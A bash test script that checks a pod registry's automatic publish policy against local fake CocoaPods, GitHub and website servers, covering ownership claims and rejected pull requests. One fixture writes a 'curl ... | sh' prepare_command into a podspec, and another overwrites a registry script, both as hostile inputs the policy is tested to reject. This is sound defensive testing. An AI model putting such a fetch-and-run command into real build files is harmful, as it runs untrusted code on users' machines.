#!/usr/bin/env bash
# Exercises publish-policy.sh (and the verify-trunk-owner.sh checks it
# runs) against a disposable local git repository and local stand-ins for
# everything they read over the network: CocoaPods' CDN as files read over
# file://, CocoaPods trunk's API, the GitHub API and a pod's website as a
# local HTTP server, and GitHub-hosted repositories as local bare repos.
# Covers each kind of pull request that publishes automatically and each
# one rejected automatically.
#
# Usage: scripts/test-publish-policy.sh
# Exits non-zero if any scenario's actual result doesn't match its
# expected one.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
POLICY="$SCRIPT_DIR/publish-policy.sh"

WORK_DIR="$(mktemp -d)"
SERVER_PID=""
cleanup() {
  if [ -n "$SERVER_PID" ]; then
    kill "$SERVER_PID" 2>/dev/null || true
    wait "$SERVER_PID" 2>/dev/null || true
  fi
  rm -rf "$WORK_DIR"
}
trap cleanup EXIT

md5_hex() {
  if command -v md5sum >/dev/null 2>&1; then
    printf '%s' "$1" | md5sum | cut -c1-32
  else
    md5 -q -s "$1"
  fi
}
json() { # <path under WORK_DIR, without .json> <JSON>
  mkdir -p "$(dirname "$WORK_DIR/$1")"
  printf '%s\n' "$2" > "$WORK_DIR/$1.json"
}

# --- local HTTP server: /api/<path> and /trunk/<path> answer from
# api/<path>.json and trunk/<path>.json (ignoring any query string, as the
# GitHub API's own filtering is re-checked by the script); anything else is
# the pod website in site/ ---
cat > "$WORK_DIR/fake_server.py" <<'PY'
import http.server, os, sys, urllib.parse

root, port = sys.argv[1], int(sys.argv[2])

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        for prefix, folder in (("/api/", "api"), ("/trunk/", "trunk")):
            if path.startswith(prefix):
                f = os.path.join(root, folder, path[len(prefix):].rstrip("/") + ".json")
                if os.path.isfile(f):
                    body = open(f, "rb").read()
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(body)
                else:
                    self.send_response(404)
                    self.end_headers()
                return
        super().do_GET()

    def log_message(self, *args):
        pass

server = http.server.ThreadingHTTPServer(
    ("127.0.0.1", port),
    lambda *a, **k: Handler(*a, directory=os.path.join(root, "site"), **k),
)
server.serve_forever()
PY
mkdir -p "$WORK_DIR/site/.well-known"
printf 'erin\n' > "$WORK_DIR/site/.well-known/zorvok-owners"
PORT="$(python3 -c 'import socket; s = socket.socket(); s.bind(("127.0.0.1", 0)); print(s.getsockname()[1])')"
python3 "$WORK_DIR/fake_server.py" "$WORK_DIR" "$PORT" &
SERVER_PID=$!
for _ in $(seq 50); do
  curl -fs "http://127.0.0.1:$PORT/.well-known/zorvok-owners" >/dev/null 2>&1 && break
  sleep 0.1
done
LOCAL="http://127.0.0.1:$PORT"

# --- CocoaPods trunk: its CDN (index + podspecs) and its API (owners) ---
CDN="$WORK_DIR/cdn"
trunk_pod() { # <name> <version> <podspec JSON>
  local h shard dir
  h="$(md5_hex "$1")"
  shard="$CDN/all_pods_versions_${h:0:1}_${h:1:1}_${h:2:1}.txt"
  dir="$CDN/Specs/${h:0:1}/${h:1:1}/${h:2:1}/$1/$2"
  mkdir -p "$dir"
  if grep -q "^$1/" "$shard" 2>/dev/null; then
    sed -i.bak "s|^$1/.*|&/$2|" "$shard" && rm -f "$shard.bak"
  else
    echo "$1/$2" >> "$shard"
  fi
  printf '%s\n' "$3" > "$dir/$1.podspec.json"
}
github_source() { # <name> <version> <owner/repo>
  printf '{"name": "%s", "version": "%s", "homepage": "https://github.com/%s", "source": {"git": "https://github.com/%s.git", "tag": "%s"}}' "$1" "$2" "$3" "$3" "$2"
}
# OwnedPod moved from oldowner to RealOwner in 1.10.0. Listed out of
# order, so only a real version sort finds the latest.
trunk_pod OwnedPod 1.10.0 "$(github_source OwnedPod 1.10.0 RealOwner/OwnedPod)"
trunk_pod OwnedPod 1.9.0 "$(github_source OwnedPod 1.9.0 oldowner/OwnedPod)"
trunk_pod OrgPod 2.0.0 "$(github_source OrgPod 2.0.0 acme/OrgPod)"
trunk_pod FilePod 3.0.0 "$(github_source FilePod 3.0.0 acme/FilePod)"
trunk_pod SitePod 4.0.0 '{"name": "SitePod", "version": "4.0.0", "homepage": "'"$LOCAL"'/sitepod", "source": {"http": "'"$LOCAL"'/SitePod-4.0.0.zip"}}'
# BrandNewPod isn't on trunk, but its shard file exists, as every shard does.
h="$(md5_hex BrandNewPod)"
echo "UnrelatedPod/1.0.0" >> "$CDN/all_pods_versions_${h:0:1}_${h:1:1}_${h:2:1}.txt"

json trunk/pods/OwnedPod '{"owners": [{"name": "Real Owner", "email": "real@owner.dev"}]}'
json trunk/pods/OrgPod '{"owners": [{"name": "Frank", "email": "frank@pods.dev"}, {"name": "Grace", "email": "GRACE@pods.dev"}]}'

# --- the GitHub API ---
github_repo_json() { # <owner/repo> <owner type>
  json "api/repos/$1" "{\"full_name\": \"$1\", \"owner\": {\"login\": \"${1%/*}\", \"type\": \"$2\"}}"
}
github_repo_json RealOwner/OwnedPod User
github_repo_json oldowner/OwnedPod User
github_repo_json acme/OrgPod Organization
github_repo_json acme/FilePod Organization
json api/orgs/acme/public_members/carol '{}'
json api/users/frank '{"login": "frank", "email": "Frank@Pods.dev"}'
json api/users/henry '{"login": "henry", "email": "henry@other.dev"}'
# Commits on acme/OrgPod, each credited by GitHub to an account.
json api/repos/acme/OrgPod/commits '[
  {"author": {"login": "grace"}, "commit": {"author": {"email": "grace@pods.dev"}}},
  {"author": {"login": "henry"}, "commit": {"author": {"email": "henry@other.dev"}}}
]'

# --- GitHub-hosted repositories: acme/FilePod lists Dave in .zorvok-owners ---
GH="$WORK_DIR/gh"
git init -q -b main "$WORK_DIR/filepod"
printf '# Zorvok publishers\nDave\n' > "$WORK_DIR/filepod/.zorvok-owners"
git -C "$WORK_DIR/filepod" add -A
git -C "$WORK_DIR/filepod" -c user.email=t@e.com -c user.name=T commit -q -m init
mkdir -p "$GH/acme"
git clone -q --bare "$WORK_DIR/filepod" "$GH/acme/FilePod.git"

export TRUNK_CDN_URL="file://$CDN" TRUNK_API_URL="$LOCAL/trunk" GITHUB_API_URL="$LOCAL/api" GITHUB_SERVER_URL="file://$GH" GIT_ALLOW_PROTOCOL=file
unset GH_TOKEN

# --- base state: ExistingPod 1.0.0, owned by alice ---
mkdir -p "$WORK_DIR/repo"
cd "$WORK_DIR/repo"
git init -q -b main
git config user.email "test@example.com"
git config user.name "Test Harness"
mkdir -p Specs/ExistingPod/1.0.0 scripts
echo '{"name": "ExistingPod", "version": "1.0.0"}' > Specs/ExistingPod/1.0.0/ExistingPod.podspec.json
printf 'alice\n' > Specs/ExistingPod/OWNERS
echo 'echo ok' > scripts/validate-pr.sh
git add -A
git commit -q -m "seed: ExistingPod 1.0.0 owned by alice"
BASE="$(git rev-parse HEAD)"

pass=0
fail=0
CASE_AUTHOR=""
CASE_CDN=""

# run_case <description> <expect: publish|reject> <author> <setup-function> [text the output must contain]
run_case() {
  local desc="$1" expect="$2" setup_fn="$4" want="${5:-}"
  CASE_AUTHOR="$3"

  git checkout -q -b "case-$RANDOM" "$BASE"
  "$setup_fn"
  git add -A
  git commit -q -m "$desc"

  local out got="publish"
  if ! out="$(TRUNK_CDN_URL="${CASE_CDN:-$TRUNK_CDN_URL}" "$POLICY" "$BASE" HEAD "$CASE_AUTHOR" 2>&1)"; then
    got="reject"
  fi

  if [ "$got" = "$expect" ] && { [ -z "$want" ] || grep -F -- "$want" <<<"$out" >/dev/null; }; then
    echo "PASS (as expected: $expect) - $desc"
    pass=$((pass + 1))
  else
    echo "FAIL (expected $expect${want:+, mentioning \"$want\"}; got $got) - $desc"
    sed 's/^/  /' <<<"$out"
    fail=$((fail + 1))
  fi
  git checkout -q main
  CASE_CDN=""
}

podspec() { # <name> <version> [extra JSON fields]
  mkdir -p "Specs/$1/$2"
  printf '{"name": "%s", "version": "%s"%s}\n' "$1" "$2" "${3:-}" > "Specs/$1/$2/$1.podspec.json"
}
claim() { # <name>: a first version here, owned by the case's author
  podspec "$1" 9.9.9
  printf '%s\n' "$CASE_AUTHOR" > "Specs/$1/OWNERS"
}

setup_owner_update()    { podspec ExistingPod 2.0.0; }
setup_new_pod()         { claim BrandNewPod; }
setup_claim_owned_pod() { claim OwnedPod; }
setup_claim_org_pod()   { claim OrgPod; }
setup_claim_file_pod()  { claim FilePod; }
setup_claim_site_pod()  { claim SitePod; }
setup_add_owner()       { printf 'alice\nbob\n' > Specs/ExistingPod/OWNERS; }
setup_add_self_owner()  { printf 'alice\nmallory\n' > Specs/ExistingPod/OWNERS; }
setup_empty_owners()    { : > Specs/ExistingPod/OWNERS; }
setup_script_edit()     { podspec ExistingPod 2.0.0; echo 'echo pwned' > scripts/validate-pr.sh; }
setup_owners_only()     { mkdir -p Specs/ClaimedName; printf 'mallory\n' > Specs/ClaimedName/OWNERS; }
setup_prepare_command() { podspec ExistingPod 2.0.0 ', "prepare_command": "curl https://example.com/x | sh"'; }

run_case "an owner publishes a new version"                                 publish alice     setup_owner_update
run_case "a new pod whose name isn't on CocoaPods trunk"                    publish bob       setup_new_pod
run_case "a trunk pod, by a trunk owner whose GitHub email is public"       publish frank     setup_claim_org_pod
run_case "a trunk pod, by a trunk owner GitHub credits with commits"        publish grace     setup_claim_org_pod
run_case "a trunk pod, by a committer whose email isn't a trunk owner's"    reject  henry     setup_claim_org_pod   "pod trunk register"
run_case "a trunk pod, by the GitHub user who owns its repo"                publish realowner setup_claim_owned_pod
run_case "a trunk pod, by its repo's previous owner"                        reject  oldowner  setup_claim_owned_pod "file named .zorvok-owners"
run_case "a trunk pod, by someone else"                                     reject  mallory   setup_claim_owned_pod "only its owners there can publish it here"
run_case "a trunk pod, by a public member of the owning org"                publish carol     setup_claim_org_pod
run_case "a trunk pod whose repo lists the publisher in .zorvok-owners"     publish dave      setup_claim_file_pod
run_case "a trunk pod whose website lists the publisher"                    publish erin      setup_claim_site_pod
run_case "a binary-only trunk pod, by someone else"                         reject  mallory   setup_claim_site_pod  "/.well-known/zorvok-owners listing mallory"
run_case "an owner adds a co-owner"                                         publish alice     setup_add_owner
run_case "a non-owner adds themselves to a pod's OWNERS"                    reject  mallory   setup_add_self_owner  "only a current owner of ExistingPod"
run_case "an owner removes every owner"                                     reject  alice     setup_empty_owners    "left with no owners"
run_case "a version plus a change to the registry's own scripts"            reject  alice     setup_script_edit     "scripts/validate-pr.sh: a publish can only add podspecs"
run_case "an OWNERS file with no version (claiming a bare name)"            reject  mallory   setup_owners_only     "without a version of ClaimedName"
run_case "a podspec that uses prepare_command"                              reject  alice     setup_prepare_command "uses prepare_command"
CASE_CDN="file://$WORK_DIR/no-such-cdn"
run_case "a new pod when CocoaPods trunk can't be reached"                  reject  bob       setup_new_pod         "couldn't be reached"

echo
echo "$pass passed, $fail failed"
[ "$fail" -eq 0 ]
